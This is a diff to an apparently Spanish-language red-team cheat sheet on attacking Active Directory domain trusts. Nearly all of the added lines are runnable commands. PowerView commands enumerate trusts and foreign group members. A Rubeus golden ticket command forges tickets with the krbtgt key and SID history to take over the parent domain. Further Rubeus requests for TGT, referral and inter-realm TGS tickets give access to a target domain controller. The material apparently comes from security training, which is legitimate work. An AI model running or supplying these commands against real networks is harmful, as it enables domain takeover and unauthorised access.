@@ -660,7 +660,41 @@ Enumerar Dominios
 ```
 powershell Get-DomainTrust
 ```
+Coger el SID del grupo del dominio objetivo
+```
+powershell Get-DomainGroup -Identity "Domain Admins" -Domain DOMINIO_OBJETIVO.local -Properties ObjectSid
+```
 Nombre del DC del dominio
 ```
 powershell Get-DomainController -Domain DOMINIO | select Name
+```
+### Golden Ticket
+```
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:AES_KRBTGT /user:Administrator /domain:DOMAIN_CHILD /sid:SID_CHILD /sids:SID_GRUPO_OBJETIVO /nowrap
+```
+## One-Way Inbound
+
+Mirar los grupos que contienen usuarios del otro dominio
+```
+powershell Get-DomainForeignGroupMember -Domain DOMINIO_OBJETIVO.local
+```
+Transformar el SID en texto
+```
+powershell ConvertFrom-SID SID
+```
+Ver los usuarios a los que pertenece ese grupo
+```
+powershell Get-DomainGroupMember -Identity "GRUPO" | select MemberName
+```
+Soliticar un TGT del usuario
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:DOMINIO_local.local /aes256:AES_USER /nowrap
+```
+Solicitar un Referral Ticket
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/DOMINIO_OBJETIVO /domain:dominio.local /dc:DC_LOCAL.domino /ticket:doIFwj[...]MuaW8= /nowrap
+```
+Solicitar un TGS con el Inter-Realm Ticket
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/DC_OBJETIVO.dominio /domain:DOMINIO_OBJETIVO /dc:DC_OBJETIVO.dominio /ticket:doIFoz[...]NPTQ== /nowrap
 ```
